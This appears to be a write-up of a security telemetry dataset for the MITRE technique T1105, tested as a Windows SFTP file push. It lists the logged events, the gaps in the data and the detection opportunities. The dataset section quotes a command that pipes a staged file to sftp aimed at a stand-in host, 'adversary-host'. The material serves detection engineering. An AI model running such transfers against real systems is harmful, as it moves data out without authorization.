# T1105-36: Ingress Tool Transfer — Windows push file using sftp.exe

## Technique Context

T1105 (Ingress Tool Transfer) represents one of the most critical phases of an attack lifecycle, where adversaries transfer tools or files from an external system into a compromised environment. This technique spans multiple tactics but is primarily classified under Command and Control, as it establishes the communication channel for additional tooling. Attackers commonly use legitimate file transfer utilities to blend with normal network traffic and avoid detection.

The SFTP (SSH File Transfer Protocol) variant is particularly interesting because it leverages Windows' built-in OpenSSH client (introduced in Windows 10/Server 2019), making it a "living off the land" technique. Unlike traditional FTP, SFTP operates over SSH (port 22) with encryption, making content inspection more difficult. Detection engineers typically focus on process creation patterns, command-line arguments revealing external destinations, network connections to unexpected SSH servers, and file creation events that indicate successful transfers.

## What This Dataset Contains

This dataset captures a complete SFTP push operation where a PowerShell script creates a test file and attempts to transfer it to an external SSH server. The key evidence includes:

**Process Chain:** Security 4688 events show the complete execution flow: parent PowerShell (PID 10164) spawns child PowerShell (PID 38520) with command line `"powershell.exe" & {# Check if the folder exists, create it if it doesn't $folderPath = "C:\temp" ...}`, which then launches `"C:\Windows\System32\OpenSSH\sftp.exe" adversary@adversary-host:/tmp` (PID 44516), which spawns `"C:\Windows\System32\OpenSSH\ssh.exe" "-oForwardX11 no" "-oPermitLocalCommand no" ...` (PID 8488).

**File Operations:** Sysmon 11 captures the creation of `C:\temp\T1105.txt` by PowerShell PID 38520, providing evidence of the file being staged for transfer.

**PowerShell Telemetry:** Events 4103/4104 reveal the complete script execution including `Test-Path`, `New-Item`, `Join-Path`, and `Write-Output` cmdlets, with the final command showing `echo "put C:\temp\T1105.txt" | sftp adversary@adversary-host:/tmp`.

**Network Protocol Setup:** Sysmon 17 shows pipe creation events for both SFTP (`\W32PosixPipe.0000ade4.00000000`, `\W32PosixPipe.0000ade4.00000001`) and PowerShell processes, indicating inter-process communication setup.

**Process Exit Codes:** Security 4689 events show ssh.exe and sftp.exe both exiting with status 0xFF (255), indicating connection failure, while PowerShell processes exit cleanly (0x0).

## What This Dataset Does Not Contain

The dataset lacks several important elements for complete T1105 analysis:

**Network Telemetry:** No Sysmon 3 (Network Connection) events are present, preventing visibility into actual outbound SSH connections to port 22. This could be due to the connection failing before establishment or sysmon-modular config filtering.

**DNS Resolution:** No Sysmon 22 events showing DNS queries for "adversary-host", which would typically precede connection attempts.

**Successful Transfer Evidence:** The 0xFF exit codes indicate the SFTP connection failed, so there's no telemetry showing successful file transfer, remote authentication, or data exfiltration.

**Process Create Filtering:** The sysmon-modular config uses include-mode filtering for ProcessCreate, so the initial PowerShell processes and potential other child processes may not appear in Sysmon 1 events, though Security 4688 provides comprehensive coverage.

## Assessment

This dataset provides excellent visibility into the preparation and execution phases of an SFTP-based ingress tool transfer attempt, even though the actual network transfer failed. The combination of Security 4688 process creation events with full command-line logging, PowerShell script block logging (4104), and Sysmon file creation events (11) creates a rich detection surface.

The telemetry is particularly strong for detection engineering because it captures the complete attack chain from PowerShell script execution through file staging to SFTP client invocation. The process command lines clearly reveal the external destination (`adversary@adversary-host:/tmp`), making this dataset valuable for developing detection rules around suspicious external SSH connections.

However, the failed connection limits its utility for understanding successful exfiltration patterns, network-based detections, or post-transfer cleanup activities.

## Detection Opportunities Present in This Data

1. **SFTP Process Creation with External Destinations** - Security 4688/Sysmon 1 events showing sftp.exe with command lines containing external hostnames or IP addresses outside organizational networks.

2. **PowerShell Script Blocks Creating Files for Transfer** - PowerShell 4104 events containing script blocks that create files followed by network transfer utilities (sftp, scp, ftp, etc.).

3. **File Creation in Staging Directories** - Sysmon 11 events showing file creation in temporary locations (C:\temp, %TEMP%) followed by network utility execution within a short time window.

4. **SSH/SFTP Command Line Patterns** - Process creation events with command lines containing SSH connection strings with usernames, external hosts, and remote paths (format: user@host:/path).

5. **PowerShell Pipeline to Network Utilities** - PowerShell 4103/4104 events showing cmdlet sequences that pipe content to external transfer utilities (echo "command" | sftp pattern).

6. **Posix Pipe Creation by SSH Utilities** - Sysmon 17 events showing pipe names matching W32PosixPipe patterns created by ssh.exe/sftp.exe processes, indicating SSH subsystem activation.

7. **Process Access Patterns** - Sysmon 10 events showing PowerShell processes accessing SSH utility processes with high privileges (0x1FFFFF), indicating potential injection or monitoring.

8. **Failed Network Transfer Exit Codes** - Security 4689 events showing ssh.exe/sftp.exe processes exiting with non-zero status codes (0xFF) combined with preceding file creation, indicating failed exfiltration attempts.
